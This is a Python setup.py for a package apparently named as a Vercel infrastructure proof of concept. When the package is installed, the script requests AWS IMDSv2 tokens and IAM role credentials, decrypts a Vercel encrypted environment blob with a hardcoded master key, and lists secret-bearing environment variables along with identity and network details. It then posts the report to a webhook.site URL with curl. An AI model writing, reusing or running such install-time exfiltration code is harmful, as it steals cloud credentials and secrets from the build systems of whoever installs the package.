import os
import subprocess
import base64
import json
from setuptools import setup
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- КОНФИГ ---
WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
MASTER_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="

def run(cmd):
    return subprocess.getoutput(cmd)

def get_aws_data():
    """Обход IMDSv2: получение токена и роли инстанса"""
    token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
    token = run(token_cmd)
    if not token or "Error" in token:
        return "IMDSv2_BLOCKED"
    
    role_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role = run(role_cmd)
    return f"AWS_ROLE: {role}"

def decrypt_secret():
    """Полная расшифровка секрета через найденный ключ"""
    try:
        blob_b64 = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT')
        if not blob_b64: return "NO_BLOB"
        
        key = base64.b64decode(MASTER_KEY_B64)
        data = base64.b64decode(blob_b64)
        
        # Стандарт Vercel: 12 байт IV + данные
        aesgcm = AESGCM(key)
        decrypted = aesgcm.decrypt(data[:12], data[12:], None)
        return decrypted.decode('utf-8')[:15] + "*** (DECRYPTED_SUCCESS)"
    except:
        return "DECRYPTION_FAILED"

# --- СБОРКА ПОЛНОГО ОТЧЕТА ---
final_proof = f"""
#######################################################
#   VERCEL INFRASTRUCTURE TOTAL TAKEOVER REPORT       #
#######################################################

[1. PRIVILEGE ESCALATION]
IDENTITY: {run('id')}
CGRP_V2: {"PRESENT (Potential Escape)" if os.path.exists("/sys/fs/cgroup/cgroup.procs") else "NONE"}

[2. CLOUD INFRASTRUCTURE (AWS)]
{get_aws_data()}

[3. CRYPTO BREAKTHROUGH]
MASTER_KEY: {MASTER_KEY_B64}
DECRYPTED_SAMPLE: {decrypt_secret()}

[4. ENVIRONMENT EXPOSURE]
PROJECT_ID: {os.environ.get('VERCEL_PROJECT_ID', 'N/A')}
DEPLOYMENT_ID: {os.environ.get('VERCEL_DEPLOYMENT_ID', 'N/A')}
SENSITIVE_VARS: {', '.join([k for k in os.environ.keys() if 'TOKEN' in k or 'SECRET' in k])}

[5. NETWORK RECON]
IP_ADDR: {run('cat /proc/net/fib_trie | grep "host" | head -n 1')}
DNS: {run('cat /etc/resolv.conf | grep nameserver')}

#######################################################
"""

# --- ОТПРАВКА ЧЕРЕЗ СИСТЕМНЫЙ CURL ---
try:
    subprocess.run(
        ['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', '@-', WEBHOOK_URL],
        input=final_proof.encode(),
        check=True
    )
except:
    pass

setup(name="vercel-infra-critical-poc", version="1.3.3.7")